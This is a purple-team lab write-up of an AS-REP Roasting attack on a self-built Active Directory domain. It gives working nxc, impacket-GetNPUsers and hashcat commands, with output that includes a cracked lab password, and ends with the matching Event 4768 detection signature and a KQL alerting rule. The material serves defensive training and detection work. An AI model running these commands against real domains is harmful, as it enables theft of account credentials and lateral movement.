# Phase 03: On-Prem Attacks — Attack #2: AS-REP Roasting

**Technique:** AS-REP Roasting
**MITRE ATT&CK:** T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting
**Privilege required:** None — AS-REQ can be sent unauthenticated (domain credential used only for enumeration)
**Tools used:** nxc (NetExec), impacket-GetNPUsers, hashcat
**Account targeted:** svc.backup (pre-authentication disabled, RC4 forced)
**Outcome:** svc.backup password recovered offline

---

## What AS-REP Roasting Is

When Kerberos pre-authentication is disabled on an account, the KDC responds to any AS-REQ for that account with an AS-REP containing data encrypted with the account's password hash — without verifying the requester knows the password first. An attacker captures that AS-REP, takes it offline, and cracks it.

This is simpler than Kerberoasting in two ways:

1. No domain credential required — the AS-REQ can be sent unauthenticated
2. One step instead of two — no SPN enumeration needed, just find accounts with pre-auth disabled and request their AS-REP

Like Kerberoasting, this is not a Kerberos vulnerability. It abuses a legitimate configuration setting that exists for legacy application compatibility.

---

## Comparison With Kerberoasting

| Property | Kerberoasting | AS-REP Roasting |
|---|---|---|
| Target type | Accounts with SPNs | Accounts with pre-auth disabled |
| Exchange abused | TGS-REQ (service ticket) | AS-REQ (initial auth) |
| Requires domain credential | Yes | No |
| Hash prefix | `$krb5tgs$` | `$krb5asrep$` |
| Hashcat mode (RC4) | 13100 | 18200 |
| Hashcat mode (AES256) | 19700 | No hashcat support |
| Detection event | 4769 | 4768 |
| Detection field | Multiple requests, short window | Pre-Authentication Type = 0 |

---

## Why This Lab Environment Was Vulnerable

`svc.backup` had `DoesNotRequirePreAuth = True` set (UAC bit 4194304) — the deliberate misconfiguration from Phase 02. This means the KDC issues an AS-REP for this account in response to any request, authenticated or not.

---

## Issues Encountered and Fixed

### Issue 1 — svc.backup in wrong OU

`svc.backup` was found in `CN=Users` (default container) instead of `OU=ServiceAccounts,OU=KaveeLab`. This happened because the `$svcOU` variable was not active when the account was created. Fixed by moving it via ADUC before the attack ran.

### Issue 2 — AES256 hash, no hashcat support

WS2025 enforces AES by default. The initial AS-REP returned `$krb5asrep$18$` (AES256). Hashcat has no mode for this format — mode 18200 handles RC4 only (`$krb5asrep$23$`).

**Fix applied:** set `msDS-SupportedEncryptionTypes = 4` (RC4 only) on `svc.backup` via ADUC Attribute Editor. This is a realistic misconfiguration — legacy applications sometimes require RC4 on specific service accounts. After this change, impacket returned `$krb5asrep$23$` as expected.

### Issue 3 — PowerShell parameter error

`Set-ADUser -KerberosEncryptionType RC4` fails on WS2025 — parameter name changed in newer AD module versions. Correct approach is via raw attribute in ADUC Attribute Editor (`msDS-SupportedEncryptionTypes` → value `4`).

### Issue 4 — DNS reset after reboot

Kali's `/etc/resolv.conf` reverts to VMware gateway after reboot when NetworkManager manages DNS. Fixed permanently via nmcli:

```bash
sudo nmcli connection modify "Wired connection 1" ipv4.dns "192.168.112.10 192.168.112.2"
sudo nmcli connection modify "Wired connection 1" ipv4.ignore-auto-dns yes
sudo nmcli connection up "Wired connection 1"
```

---

## The Attack — Step by Step

### Step 1 — Credential verification

```bash
nxc smb 192.168.112.10 -u john.smith -p 'Password123!' -d kaveelab.internal
```

Confirmed `[+]` — john.smith valid. Used for LDAP enumeration only. The actual AS-REQ for svc.backup is unauthenticated.

### Step 2 — AS-REP hash capture

```bash
impacket-GetNPUsers kaveelab.internal/john.smith:'Password123!' \
    -dc-ip 192.168.112.10 \
    -request \
    -outputfile /tmp/asrep_hashes.txt
```

Output:

```
Name        UAC
svc.backup  0x410200

$krb5asrep$23$svc.backup$KAVEELAB.INTERNAL$[hash...]
```

`0x410200` decoded: normal account (0x200) + password never expires (0x10000) + DoNotRequirePreAuth (0x400000).

Hash prefix `$krb5asrep$23$` confirms RC4 — the `23` is etype for RC4-HMAC.

### Step 3 — Offline cracking (Windows host)

ATTACKER01 (VMware VM) has no GPU passthrough — hashcat cannot access GPU hardware from inside the VM. Hash file copied to Windows host where hashcat has full RTX 3050 access. This reflects the realistic attacker workflow: attacking VMs are for attacking, dedicated cracking hardware is for cracking.

```cmd
.\hashcat.exe -m 18200 asrep_hashes.txt passwords.txt
```

Result:

```
Status: Cracked
Recovered: 1/1 (100.00%)
Time: 0 secs
$krb5asrep$23$svc.backup@KAVEELAB.INTERNAL:...:Backup2023!
```

RC4 cracked in 0 seconds — significantly faster than AES256 from Kerberoasting. This is why attackers force RC4 when possible, and why detecting RC4 on AES-enforcing domains is a high-value signal.

---

## What DC01 Logged — Event ID 4768

One 4768 event generated — one AS-REQ for svc.backup.

| Field | Value | Significance |
|---|---|---|
| Account Name | svc.backup | The target account |
| Pre-Authentication Type | 0 | **The attack signature** — normal auth shows 2 |
| Ticket Encryption Type | 0x17 (RC4) | RC4 on WS2025 = deliberate downgrade |
| Client Address | 192.168.112.xxx | ATTACKER01's IP |
| Result Code | 0x0 | AS-REP issued without rejection |

`Pre-Authentication Type: 0` is the definitive field. In normal domain operations this is almost never 0 — it means pre-auth was not provided or required. A single 4768 with this value from a non-machine account is immediately actionable.

---

## KQL Detection Rule

Stored at `scripts/kql-asrep-roasting.kql`. Tests in Microsoft Sentinel in Phase 07.

Detection logic: a single Event 4768 with Pre-Authentication Type = 0 from a non-machine account is sufficient to alert — no correlation window or request count needed. Unlike Kerberoasting (which requires multiple 4769s to distinguish from legitimate traffic), a single AS-REP with no pre-auth is already suspicious on its own.

---

## What the Cracked Password Enables

`svc.backup:Backup2023!` recovered. No SPN registered on this account, so it does not feed Silver Ticket directly. Enables authentication as `svc.backup` against any resource it has access to — potential lateral movement depending on what backup software or network shares this account is configured to access.

Cracked credential stored in private Notion journal only. Not in this repository.

---

## Purple Team Loop

| Step | Status |
|---|---|
| Attack executed from ATTACKER01 | ✅ |
| RC4 AS-REP hash captured for svc.backup | ✅ |
| Event 4768 confirmed on DC01 — Pre-Auth Type 0 | ✅ |
| Hash cracked offline — Backup2023! recovered | ✅ |
| KQL detection rule written | ✅ |
| KQL rule tested in Microsoft Sentinel | ⏳ Phase 07 |
